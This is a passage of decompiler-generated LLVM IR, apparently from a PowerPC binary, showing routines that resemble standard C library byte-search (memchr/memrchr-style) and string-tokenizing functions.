  %v0_1000aa40 = phi i32 [ %v1_1000aa10, %dec_label_pc_1000aa0c ], [ %v0_1000aa40.pre, %dec_label_pc_1000aa3c.loopexit ]
  %v0_1000aa3c = phi i32 [ 0, %dec_label_pc_1000aa0c ], [ %v0_1000aa3c.pre, %dec_label_pc_1000aa3c.loopexit ]
  %v0_1000aa6416 = phi i32 [ %v0_1000aa307, %dec_label_pc_1000aa0c ], [ %v0_1000aa6416.ph, %dec_label_pc_1000aa3c.loopexit ]
  %v1_1000aa3c = udiv i32 %v0_1000aa3c, 4
  %v1_1000aa40 = mul i32 %v0_1000aa40, 256
  %v2_1000aa48 = or i32 %v1_1000aa40, %v0_1000aa40
  %v1_1000aa50 = mul i32 %v2_1000aa48, 65536
  %v2_1000aa58 = or i32 %v1_1000aa50, %v2_1000aa48
  store i32 %v1_1000aa3c, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000aa3c, 4
  br i1 %tmp, label %dec_label_pc_1000aaec, label %dec_label_pc_1000aa64

dec_label_pc_1000aa64:                            ; preds = %dec_label_pc_1000aa3c, %dec_label_pc_1000aae8.backedge
  %v0_1000aae8 = phi i32 [ %v1_1000aae8, %dec_label_pc_1000aae8.backedge ], [ %v1_1000aa3c, %dec_label_pc_1000aa3c ]
  %v0_1000aa6c = phi i32 [ %v1_1000aa6c, %dec_label_pc_1000aae8.backedge ], [ %v0_1000aa3c, %dec_label_pc_1000aa3c ]
  %v0_1000aaa4 = phi i32 [ %v1_1000aa68, %dec_label_pc_1000aae8.backedge ], [ %v0_1000aa6416, %dec_label_pc_1000aa3c ]
  %v1_1000aa64 = inttoptr i32 %v0_1000aaa4 to i32*
  %v2_1000aa64 = load i32, i32* %v1_1000aa64, align 4
  %v1_1000aa68 = add i32 %v0_1000aaa4, 4
  store i32 %v1_1000aa68, i32* @r3, align 4
  %v1_1000aa6c = add i32 %v0_1000aa6c, -4
  store i32 %v1_1000aa6c, i32* %r5.global-to-local, align 4
  %v2_1000aa70 = xor i32 %v2_1000aa64, %v2_1000aa58
  %v1_1000aa78 = add i32 %v2_1000aa70, 2130640639
  %v2_1000aa7c = xor i32 %v1_1000aa78, %v2_1000aa70
  %v2_1000aa84 = and i32 %v2_1000aa7c, -2130640640
  %v6_1000aa84 = icmp eq i32 %v2_1000aa84, -2130640640
  br i1 %v6_1000aa84, label %dec_label_pc_1000aae8.backedge, label %dec_label_pc_1000aa8c

dec_label_pc_1000aae8.backedge:                   ; preds = %dec_label_pc_1000aa64, %dec_label_pc_1000aad4
  %v1_1000aae8 = add i32 %v0_1000aae8, -1
  store i32 %v1_1000aae8, i32* %ctr.global-to-local, align 4
  %v2_1000aae8 = icmp eq i32 %v1_1000aae8, 0
  br i1 %v2_1000aae8, label %dec_label_pc_1000aaec, label %dec_label_pc_1000aa64

dec_label_pc_1000aa8c:                            ; preds = %dec_label_pc_1000aa64
  %v2_1000aa8c = inttoptr i32 %v0_1000aaa4 to i8*
  %v3_1000aa8c = load i8, i8* %v2_1000aa8c, align 1
  %v4_1000aa8c = zext i8 %v3_1000aa8c to i32
  %v1_1000aa90 = add i32 %v0_1000aaa4, 3
  %v1_1000aa94 = add i32 %v0_1000aaa4, 1
  %v1_1000aa98 = add i32 %v0_1000aaa4, 2
  %v4_1000aa9c = icmp eq i32 %v4_1000aa8c, %v0_1000aa40
  br i1 %v4_1000aa9c, label %dec_label_pc_1000aaa4, label %dec_label_pc_1000aaac

dec_label_pc_1000aaa4:                            ; preds = %dec_label_pc_1000aa8c
  ret i32 %v0_1000aaa4

dec_label_pc_1000aaac:                            ; preds = %dec_label_pc_1000aa8c
  %v2_1000aaac = inttoptr i32 %v1_1000aa94 to i8*
  %v3_1000aaac = load i8, i8* %v2_1000aaac, align 1
  %v4_1000aaac = zext i8 %v3_1000aaac to i32
  %v4_1000aab0 = icmp eq i32 %v4_1000aaac, %v0_1000aa40
  br i1 %v4_1000aab0, label %dec_label_pc_1000aab8, label %dec_label_pc_1000aac0

dec_label_pc_1000aab8:                            ; preds = %dec_label_pc_1000aaac
  ret i32 %v1_1000aa94

dec_label_pc_1000aac0:                            ; preds = %dec_label_pc_1000aaac
  %v2_1000aac0 = inttoptr i32 %v1_1000aa98 to i8*
  %v3_1000aac0 = load i8, i8* %v2_1000aac0, align 1
  %v4_1000aac0 = zext i8 %v3_1000aac0 to i32
  %v4_1000aac4 = icmp eq i32 %v4_1000aac0, %v0_1000aa40
  br i1 %v4_1000aac4, label %dec_label_pc_1000aacc, label %dec_label_pc_1000aad4

dec_label_pc_1000aacc:                            ; preds = %dec_label_pc_1000aac0
  ret i32 %v1_1000aa98

dec_label_pc_1000aad4:                            ; preds = %dec_label_pc_1000aac0
  %v2_1000aad4 = inttoptr i32 %v1_1000aa90 to i8*
  %v3_1000aad4 = load i8, i8* %v2_1000aad4, align 1
  %v4_1000aad4 = zext i8 %v3_1000aad4 to i32
  %v4_1000aad8 = icmp eq i32 %v4_1000aad4, %v0_1000aa40
  br i1 %v4_1000aad8, label %dec_label_pc_1000aae0, label %dec_label_pc_1000aae8.backedge

dec_label_pc_1000aae0:                            ; preds = %dec_label_pc_1000aad4
  ret i32 %v1_1000aa90

dec_label_pc_1000aaec:                            ; preds = %dec_label_pc_1000aae8.backedge, %dec_label_pc_1000aa3c
  %v0_1000aaf826 = phi i32 [ %v0_1000aa6416, %dec_label_pc_1000aa3c ], [ %v1_1000aa68, %dec_label_pc_1000aae8.backedge ]
  %v0_1000aaec = phi i32 [ %v0_1000aa3c, %dec_label_pc_1000aa3c ], [ %v1_1000aa6c, %dec_label_pc_1000aae8.backedge ]
  %v1_1000aaec = add i32 %v0_1000aaec, 1
  store i32 %v1_1000aaec, i32* %r5.global-to-local, align 4
  store i32 %v0_1000aaec, i32* %ctr.global-to-local, align 4
  %v2_1000ab083 = icmp eq i32 %v0_1000aaec, 0
  br i1 %v2_1000ab083, label %dec_label_pc_1000ab0c, label %dec_label_pc_1000aaf8

dec_label_pc_1000aaf8:                            ; preds = %dec_label_pc_1000aaec, %dec_label_pc_1000aaf8.dec_label_pc_1000aaf8_crit_edge
  %v1_1000aafc = phi i32 [ %v1_1000aafc.pre, %dec_label_pc_1000aaf8.dec_label_pc_1000aaf8_crit_edge ], [ %v0_1000aa40, %dec_label_pc_1000aaec ]
  %v0_1000aaf8 = phi i32 [ %v1_1000ab04, %dec_label_pc_1000aaf8.dec_label_pc_1000aaf8_crit_edge ], [ %v0_1000aaf826, %dec_label_pc_1000aaec ]
  %v1_1000aaf8 = inttoptr i32 %v0_1000aaf8 to i8*
  %v2_1000aaf8 = load i8, i8* %v1_1000aaf8, align 1
  %v3_1000aaf8 = zext i8 %v2_1000aaf8 to i32
  %v4_1000aafc = icmp eq i32 %v3_1000aaf8, %v1_1000aafc
  %v0_1000ab00 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000aafc, i32 %v0_1000ab00)
  %v0_1000ab04 = load i32, i32* @r3, align 4
  %v1_1000ab04 = add i32 %v0_1000ab04, 1
  store i32 %v1_1000ab04, i32* @r3, align 4
  %v0_1000ab08 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab08 = add i32 %v0_1000ab08, -1
  store i32 %v1_1000ab08, i32* %ctr.global-to-local, align 4
  %v2_1000ab08 = icmp eq i32 %v1_1000ab08, 0
  br i1 %v2_1000ab08, label %dec_label_pc_1000ab0c, label %dec_label_pc_1000aaf8.dec_label_pc_1000aaf8_crit_edge

dec_label_pc_1000aaf8.dec_label_pc_1000aaf8_crit_edge: ; preds = %dec_label_pc_1000aaf8
  %v1_1000aafc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000aaf8

dec_label_pc_1000ab0c:                            ; preds = %dec_label_pc_1000aaf8, %dec_label_pc_1000aaec
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000ab08, { 1, 0 }
  uselistorder i32 %v1_1000ab04, { 1, 0 }
  uselistorder i32 %v0_1000aaec, { 1, 2, 0 }
  uselistorder i32 %v1_1000aae8, { 2, 1, 0 }
  uselistorder i32 %v1_1000aa6c, { 0, 2, 1 }
  uselistorder i32 %v1_1000aa68, { 0, 2, 1 }
  uselistorder i32 %v0_1000aaa4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1000aa48, { 1, 0 }
  uselistorder i32 %v1_1000aa3c, { 1, 0 }
  uselistorder i32 %v0_1000aa6416, { 1, 0 }
  uselistorder i32 %v0_1000aa3c, { 3, 2, 0, 1 }
  uselistorder i32 %v0_1000aa40, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v1_1000aa34, { 1, 0 }
  uselistorder i32 %v1_1000aa2c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000aa307, { 2, 0, 1 }
  uselistorder i32 %v1_1000aa10, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000aaf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000aae8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa64, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa38, { 1, 0 }
}

define i32 @function_1000ab14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000ab14:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268479280, i32* @lr, align 4
  %v0_1000ab2c = call i32 @function_10007104()
  %v0_1000ab34 = load i32, i32* @r28, align 4
  %v1_1000ab34 = load i32, i32* @r29, align 4
  %v2_1000ab34 = add i32 %v1_1000ab34, %v0_1000ab34
  ret i32 %v2_1000ab34
}

define i32 @function_1000ab48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000ab48:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000ab4c = urem i32 %arg2, 256
  store i32 %v1_1000ab4c, i32* %r4.global-to-local, align 4
  %v2_1000ab54 = add i32 %arg3, %arg1
  store i32 %v2_1000ab54, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000ab7013 = icmp eq i32 %arg3, 0
  br i1 %v2_1000ab7013, label %dec_label_pc_1000ab78, label %dec_label_pc_1000ab74

dec_label_pc_1000ab5c:                            ; preds = %dec_label_pc_1000ab74
  %v1_1000ab5c = add i32 %v0_1000ab5c, -1
  %v2_1000ab5c = inttoptr i32 %v1_1000ab5c to i8*
  %v3_1000ab5c = load i8, i8* %v2_1000ab5c, align 1
  %v4_1000ab5c = zext i8 %v3_1000ab5c to i32
  store i32 %v1_1000ab5c, i32* %r3.global-to-local, align 4
  %v0_1000ab60 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ab60 = add i32 %v0_1000ab60, -1
  store i32 %v1_1000ab60, i32* %r5.global-to-local, align 4
  %v1_1000ab64 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000ab64 = icmp eq i32 %v4_1000ab5c, %v1_1000ab64
  %v0_1000ab68 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ab64, i32 %v0_1000ab68)
  %v0_1000ab6c = load i32, i32* %r3.global-to-local, align 4
  %v0_1000ab70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ab70 = add i32 %v0_1000ab70, -1
  store i32 %v1_1000ab70, i32* %ctr.global-to-local, align 4
  %v2_1000ab70 = icmp eq i32 %v1_1000ab70, 0
  br i1 %v2_1000ab70, label %dec_label_pc_1000ab78.loopexit, label %dec_label_pc_1000ab74

dec_label_pc_1000ab74:                            ; preds = %dec_label_pc_1000ab48, %dec_label_pc_1000ab5c
  %v0_1000ab5c = phi i32 [ %v0_1000ab6c, %dec_label_pc_1000ab5c ], [ %v2_1000ab54, %dec_label_pc_1000ab48 ]
  %v0_1000ab74.in.in = phi i32 [ %v0_1000ab6c, %dec_label_pc_1000ab5c ], [ %v2_1000ab54, %dec_label_pc_1000ab48 ]
  %v0_1000ab74.in = urem i32 %v0_1000ab74.in.in, 4
  %v0_1000ab74 = icmp eq i32 %v0_1000ab74.in, 0
  br i1 %v0_1000ab74, label %dec_label_pc_1000ab78.loopexit, label %dec_label_pc_1000ab5c

dec_label_pc_1000ab78.loopexit:                   ; preds = %dec_label_pc_1000ab74, %dec_label_pc_1000ab5c
  %v0_1000aba016.ph = phi i32 [ %v0_1000ab6c, %dec_label_pc_1000ab5c ], [ %v0_1000ab5c, %dec_label_pc_1000ab74 ]
  %v0_1000ab78.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000ab7c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ab78

dec_label_pc_1000ab78:                            ; preds = %dec_label_pc_1000ab78.loopexit, %dec_label_pc_1000ab48
  %v0_1000ab7c = phi i32 [ %v1_1000ab4c, %dec_label_pc_1000ab48 ], [ %v0_1000ab7c.pre, %dec_label_pc_1000ab78.loopexit ]
  %v0_1000ab78 = phi i32 [ 0, %dec_label_pc_1000ab48 ], [ %v0_1000ab78.pre, %dec_label_pc_1000ab78.loopexit ]
  %v0_1000aba016 = phi i32 [ %v2_1000ab54, %dec_label_pc_1000ab48 ], [ %v0_1000aba016.ph, %dec_label_pc_1000ab78.loopexit ]
  %v1_1000ab78 = udiv i32 %v0_1000ab78, 4
  %v1_1000ab7c = mul i32 %v0_1000ab7c, 256
  %v2_1000ab84 = or i32 %v1_1000ab7c, %v0_1000ab7c
  %v1_1000ab8c = mul i32 %v2_1000ab84, 65536
  %v2_1000ab94 = or i32 %v1_1000ab8c, %v2_1000ab84
  store i32 %v2_1000ab94, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_1000ab78, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000ab78, 4
  br i1 %tmp, label %dec_label_pc_1000ac18, label %dec_label_pc_1000aba0

dec_label_pc_1000aba0:                            ; preds = %dec_label_pc_1000ab78, %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge
  %v0_1000ac1421 = phi i32 [ %v1_1000ac14, %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge ], [ %v1_1000ab78, %dec_label_pc_1000ab78 ]
  %v0_1000abbc = phi i32 [ %v0_1000abbc.pre, %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge ], [ -2130640640, %dec_label_pc_1000ab78 ]
  %v0_1000aba8 = phi i32 [ %v0_1000aba8.pre, %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge ], [ %v2_1000ab94, %dec_label_pc_1000ab78 ]
  %v0_1000aba4 = phi i32 [ %v0_1000aba4.pre, %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge ], [ %v0_1000ab78, %dec_label_pc_1000ab78 ]
  %v0_1000aba0 = phi i32 [ %v0_1000aba0.pre, %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge ], [ %v0_1000aba016, %dec_label_pc_1000ab78 ]
  %v1_1000aba0 = add i32 %v0_1000aba0, -4
  %v2_1000aba0 = inttoptr i32 %v1_1000aba0 to i32*
  %v3_1000aba0 = load i32, i32* %v2_1000aba0, align 4
  store i32 %v1_1000aba0, i32* %r3.global-to-local, align 4
  %v1_1000aba4 = add i32 %v0_1000aba4, -4
  store i32 %v1_1000aba4, i32* %r5.global-to-local, align 4
  %v2_1000aba8 = xor i32 %v3_1000aba0, %v0_1000aba8
  %v1_1000abb0 = add i32 %v2_1000aba8, 2130640639
  %v2_1000abb4 = xor i32 %v1_1000abb0, %v2_1000aba8
  %v1_1000abb8 = add i32 %v0_1000aba0, -1
  %v2_1000abbc = sub i32 -1, %v2_1000abb4
  %v3_1000abbc = and i32 %v0_1000abbc, %v2_1000abbc
  %v6_1000abbc = icmp eq i32 %v3_1000abbc, 0
  br i1 %v6_1000abbc, label %dec_label_pc_1000ac14.backedge, label %dec_label_pc_1000abc4

dec_label_pc_1000abc4:                            ; preds = %dec_label_pc_1000aba0
  %v2_1000abc4 = inttoptr i32 %v1_1000abb8 to i8*
  %v3_1000abc4 = load i8, i8* %v2_1000abc4, align 1
  %v4_1000abc4 = zext i8 %v3_1000abc4 to i32
  %v1_1000abc8 = add i32 %v0_1000aba0, -2
  %v1_1000abcc = add i32 %v0_1000aba0, -3
  %v1_1000abd0 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000abd0 = icmp eq i32 %v4_1000abc4, %v1_1000abd0
  br i1 %v4_1000abd0, label %dec_label_pc_1000abd8, label %dec_label_pc_1000abe0

dec_label_pc_1000abd8:                            ; preds = %dec_label_pc_1000abc4
  store i32 %v1_1000abb8, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000abb8

dec_label_pc_1000abe0:                            ; preds = %dec_label_pc_1000abc4
  %v2_1000abe0 = inttoptr i32 %v1_1000abc8 to i8*
  %v3_1000abe0 = load i8, i8* %v2_1000abe0, align 1
  %v4_1000abe0 = zext i8 %v3_1000abe0 to i32
  %v4_1000abe4 = icmp eq i32 %v4_1000abe0, %v1_1000abd0
  br i1 %v4_1000abe4, label %dec_label_pc_1000abec, label %dec_label_pc_1000abf4

dec_label_pc_1000abec:                            ; preds = %dec_label_pc_1000abe0
  store i32 %v1_1000abc8, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000abc8

dec_label_pc_1000abf4:                            ; preds = %dec_label_pc_1000abe0
  %v2_1000abf4 = inttoptr i32 %v1_1000abcc to i8*
  %v3_1000abf4 = load i8, i8* %v2_1000abf4, align 1
  %v4_1000abf4 = zext i8 %v3_1000abf4 to i32
  %v4_1000abf8 = icmp eq i32 %v4_1000abf4, %v1_1000abd0
  br i1 %v4_1000abf8, label %dec_label_pc_1000ac00, label %dec_label_pc_1000ac08

dec_label_pc_1000ac00:                            ; preds = %dec_label_pc_1000abf4
  store i32 %v1_1000abcc, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000abcc

dec_label_pc_1000ac08:                            ; preds = %dec_label_pc_1000abf4
  %v1_1000ac08 = inttoptr i32 %v1_1000aba0 to i8*
  %v2_1000ac08 = load i8, i8* %v1_1000ac08, align 1
  %v3_1000ac08 = zext i8 %v2_1000ac08 to i32
  %v4_1000ac0c = icmp eq i32 %v3_1000ac08, %v1_1000abd0
  %v0_1000ac10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ac0c, i32 %v0_1000ac10)
  %v0_1000ac14.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ac14.backedge

dec_label_pc_1000ac14.backedge:                   ; preds = %dec_label_pc_1000ac08, %dec_label_pc_1000aba0
  %v0_1000ac14 = phi i32 [ %v0_1000ac14.pre, %dec_label_pc_1000ac08 ], [ %v0_1000ac1421, %dec_label_pc_1000aba0 ]
  %v1_1000ac14 = add i32 %v0_1000ac14, -1
  store i32 %v1_1000ac14, i32* %ctr.global-to-local, align 4
  %v2_1000ac14 = icmp eq i32 %v1_1000ac14, 0
  br i1 %v2_1000ac14, label %dec_label_pc_1000ac14.dec_label_pc_1000ac18_crit_edge, label %dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge

dec_label_pc_1000ac14.backedge.dec_label_pc_1000aba0_crit_edge: ; preds = %dec_label_pc_1000ac14.backedge
  %v0_1000aba0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000aba4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000aba8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000abbc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000aba0

dec_label_pc_1000ac14.dec_label_pc_1000ac18_crit_edge: ; preds = %dec_label_pc_1000ac14.backedge
  %v0_1000ac18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ac18

dec_label_pc_1000ac18:                            ; preds = %dec_label_pc_1000ac14.dec_label_pc_1000ac18_crit_edge, %dec_label_pc_1000ab78
  %v0_1000ac18 = phi i32 [ %v0_1000ac18.pre, %dec_label_pc_1000ac14.dec_label_pc_1000ac18_crit_edge ], [ %v0_1000ab78, %dec_label_pc_1000ab78 ]
  %v1_1000ac18 = add i32 %v0_1000ac18, 1
  store i32 %v1_1000ac18, i32* %r5.global-to-local, align 4
  store i32 %v0_1000ac18, i32* %ctr.global-to-local, align 4
  %v2_1000ac303 = icmp eq i32 %v0_1000ac18, 0
  br i1 %v2_1000ac303, label %dec_label_pc_1000ac34, label %dec_label_pc_1000ac24

dec_label_pc_1000ac24:                            ; preds = %dec_label_pc_1000ac18, %dec_label_pc_1000ac24
  %v0_1000ac24 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ac24 = add i32 %v0_1000ac24, -1
  %v2_1000ac24 = inttoptr i32 %v1_1000ac24 to i8*
  %v3_1000ac24 = load i8, i8* %v2_1000ac24, align 1
  %v4_1000ac24 = zext i8 %v3_1000ac24 to i32
  store i32 %v1_1000ac24, i32* %r3.global-to-local, align 4
  %v1_1000ac28 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000ac28 = icmp eq i32 %v4_1000ac24, %v1_1000ac28
  %v0_1000ac2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ac28, i32 %v0_1000ac2c)
  %v0_1000ac30 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ac30 = add i32 %v0_1000ac30, -1
  store i32 %v1_1000ac30, i32* %ctr.global-to-local, align 4
  %v2_1000ac30 = icmp eq i32 %v1_1000ac30, 0
  br i1 %v2_1000ac30, label %dec_label_pc_1000ac34, label %dec_label_pc_1000ac24

dec_label_pc_1000ac34:                            ; preds = %dec_label_pc_1000ac24, %dec_label_pc_1000ac18
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000ac30, { 1, 0 }
  uselistorder i32 %v0_1000ac18, { 1, 2, 0 }
  uselistorder i32 %v1_1000ac14, { 2, 1, 0 }
  uselistorder i32 %v1_1000abcc, { 1, 0, 2 }
  uselistorder i32 %v1_1000abc8, { 1, 0, 2 }
  uselistorder i32 %v1_1000abb8, { 1, 0, 2 }
  uselistorder i32 %v2_1000ab84, { 1, 0 }
  uselistorder i32 %v1_1000ab78, { 1, 0 }
  uselistorder i32 %v0_1000ab78, { 3, 2, 0, 1 }
  uselistorder i32 %v0_1000ab7c, { 1, 0 }
  uselistorder i32 %v1_1000ab70, { 1, 0 }
  uselistorder i32 %v0_1000ab6c, { 1, 0, 2 }
  uselistorder i32 %v2_1000ab54, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000ab4c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 6, 5, 1, 8, 7, 2 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ac24, { 1, 0 }
  uselistorder label %dec_label_pc_1000aba0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab74, { 1, 0 }
}

define i32 @function_1000ac3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ac3c:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000ac48 = icmp eq i32 %arg1, 0
  %v0_1000ac50 = load i32, i32* @r5, align 4
  store i32 %v0_1000ac50, i32* %r30.global-to-local, align 4
  %v0_1000ac54 = load i32, i32* @r4, align 4
  store i32 %v0_1000ac54, i32* %r29.global-to-local, align 4
  br i1 %v3_1000ac48, label %dec_label_pc_1000ac5c, label %dec_label_pc_1000ac60

dec_label_pc_1000ac5c:                            ; preds = %dec_label_pc_1000ac3c
  %v1_1000ac5c = inttoptr i32 %v0_1000ac50 to i32*
  %v2_1000ac5c = load i32, i32* %v1_1000ac5c, align 4
  store i32 %v2_1000ac5c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ac60

dec_label_pc_1000ac60:                            ; preds = %dec_label_pc_1000ac3c, %dec_label_pc_1000ac5c
  %v0_1000ac60 = phi i32 [ %arg1, %dec_label_pc_1000ac3c ], [ %v2_1000ac5c, %dec_label_pc_1000ac5c ]
  store i32 %v0_1000ac60, i32* @r3, align 4
  %v1_1000ac64 = inttoptr i32 %v0_1000ac60 to i8*
  %v2_1000ac64 = call i32 @function_1000c0e0(i8* %v1_1000ac64)
  %v0_1000ac68 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000ac6c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ac6c = add i32 %v0_1000ac6c, %v2_1000ac64
  %v3_1000ac6c = inttoptr i32 %v2_1000ac6c to i8*
  %v4_1000ac6c = load i8, i8* %v3_1000ac6c, align 1
  store i32 %v2_1000ac6c, i32* @r31, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %v2_1000ac6c, i32* @r3, align 4
  %v3_1000ac7c = icmp eq i8 %v4_1000ac6c, 0
  br i1 %v3_1000ac7c, label %dec_label_pc_1000ac84, label %dec_label_pc_1000ac8c

dec_label_pc_1000ac84:                            ; preds = %dec_label_pc_1000ac60
  %v1_1000ac84 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ac84 = inttoptr i32 %v1_1000ac84 to i32*
  store i32 %v2_1000ac6c, i32* %v2_1000ac84, align 4
  br label %dec_label_pc_1000acc4

dec_label_pc_1000ac8c:                            ; preds = %dec_label_pc_1000ac60
  store i32 268479632, i32* @lr, align 4
  %v4_1000ac8c = call i32 @function_1000acdc(i8* %v3_1000ac6c, i32 %v0_1000ac68, i32 0)
  store i32 %v4_1000ac8c, i32* %r9.global-to-local, align 4
  %v4_1000ac94 = icmp eq i32 %v4_1000ac8c, 0
  %v0_1000ac98 = load i32, i32* @r31, align 4
  store i32 %v0_1000ac98, i32* @r3, align 4
  %v2_1000ac9c = add i32 %v4_1000ac8c, 1
  store i32 %v2_1000ac9c, i32* %r11.global-to-local, align 4
  br i1 %v4_1000ac94, label %dec_label_pc_1000aca4, label %dec_label_pc_1000acb4

dec_label_pc_1000aca4:                            ; preds = %dec_label_pc_1000ac8c
  store i32 268479656, i32* @lr, align 4
  %v4_1000aca4 = call i32 @function_1000bf58(i32 %v0_1000ac98, i32 0, i32 0)
  %v0_1000aca8 = load i32, i32* @r31, align 4
  store i32 %v0_1000aca8, i32* %r9.global-to-local, align 4
  %v1_1000acac = load i32, i32* %r30.global-to-local, align 4
  %v2_1000acac = inttoptr i32 %v1_1000acac to i32*
  store i32 %v4_1000aca4, i32* %v2_1000acac, align 4
  br label %dec_label_pc_1000acc4

dec_label_pc_1000acb4:                            ; preds = %dec_label_pc_1000ac8c
  %v1_1000ac94 = inttoptr i32 %v4_1000ac8c to i8*
  store i8 0, i8* %v1_1000ac94, align 1
  %v0_1000acbc = load i32, i32* @r31, align 4
  store i32 %v0_1000acbc, i32* %r9.global-to-local, align 4
  %v0_1000acc0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000acc0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000acc0 = inttoptr i32 %v1_1000acc0 to i32*
  store i32 %v0_1000acc0, i32* %v2_1000acc0, align 4
  br label %dec_label_pc_1000acc4

dec_label_pc_1000acc4:                            ; preds = %dec_label_pc_1000aca4, %dec_label_pc_1000ac84, %dec_label_pc_1000acb4
  %v0_1000acc8 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_1000acc8

; uselistorder directives
  uselistorder i32 %v4_1000ac8c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_1000ac6c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000ac60, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000acc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ac60, { 1, 0 }
}

define i32 @function_1000acdc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000acdc:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000acfc1 = load i32, i32* @r3, align 4
  %v1_1000acfc2 = inttoptr i32 %v0_1000acfc1 to i8*
  %v2_1000acfc3 = load i8, i8* %v1_1000acfc2, align 1
  %v3_1000acfc4 = zext i8 %v2_1000acfc3 to i32
  store i32 %v3_1000acfc4, i32* %r11.global-to-local, align 4
  %v3_1000ad006 = icmp eq i8 %v2_1000acfc3, 0
